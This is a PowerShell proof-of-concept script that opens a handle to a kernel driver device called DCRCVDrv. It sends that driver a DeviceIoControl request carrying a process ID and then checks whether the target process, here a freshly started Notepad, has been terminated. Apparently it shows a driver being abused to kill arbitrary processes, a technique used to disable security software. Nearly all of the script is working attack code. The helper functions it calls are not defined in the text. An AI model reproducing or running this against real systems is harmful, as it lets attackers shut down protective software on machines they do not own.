Clear-Host
Write-Host "=== Starting Process Control & DeviceIoControl PoC ===" -ForegroundColor Cyan

$eProc  = Start-Process -FilePath Notepad -WindowStyle Minimized -PassThru
$PROCID = $eProc.Id
Write-Host "[*] Started Notepad (PID: $PROCID)" -ForegroundColor DarkGray

try {
    $hDevice = Get-FileHandle -FileName DCRCVDrv -AlternativeName DCRCVDRV_U
} catch {}

if ($hDevice -eq $null -or $hDevice -eq 0) {
    try {
        $hDevice = Get-FileHandle -FileName DCRCVDrv -AlternativeName DCRCVDRV_U -Symbolic 'Device'
    } catch {}
}

$OutRet   = New-IntPtr -Size 8
$InOutPtr = New-IntPtr -Size 8 -InitialValue $PROCID -ValueType int

[String]::Format("[+] DeviceIoControl Handle: {0}", $hDevice)

$hr = $eProc.HasExited
[String]::Format("    - Is Process Has Exited? {0}", $hr)

# Execute DeviceIoControl
$hr = $NtApi::DeviceIoControl($hDevice, 0x2205c0, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)

$statusColor = if ($hr) { "Green" } else { "Yellow" }
[String]::Format("`n[+] DeviceIoControl Call Results: {0} (Success: {1})", $hr, [bool]$hr) | Write-Host -ForegroundColor $statusColor

$eProc.Refresh()
$hr = $eProc.HasExited
[String]::Format("    - Is Process Has Exited? {0}", $hr)
[String]::Format("    - Process Exit Code: 0x{0:X}", $eProc.ExitCode)

# Cleanup
Free-IntPtr $hDevice  -Method NtHandle
Free-IntPtr $OutRet   -Method Auto
Free-IntPtr $InOutPtr -Method Auto

Write-Host "=== PoC Execution Complete ===" -ForegroundColor Cyan
Write-Host
return